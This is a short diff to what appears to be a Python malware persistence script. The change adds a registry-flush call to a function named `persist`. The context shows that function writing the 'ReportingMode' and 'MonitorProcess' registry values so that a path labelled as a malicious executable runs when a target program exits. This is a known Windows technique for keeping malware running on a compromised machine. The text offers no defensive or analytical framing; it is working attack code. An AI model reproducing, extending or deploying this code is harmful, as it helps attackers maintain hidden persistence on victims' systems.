@@ -63,6 +63,7 @@ def persist(malicious_exe_path:str, target_exe:str, target_reg_keys:list):
           else:
             SetValueEx(hklm, "ReportingMode", 0, REG_DWORD, 1)
             SetValueEx(hklm, "MonitorProcess", 0, REG_SZ, malicious_exe_path)
+  flush_registry_changes()
 
 if __name__ == "__main__":
   target_exe = argv[1]
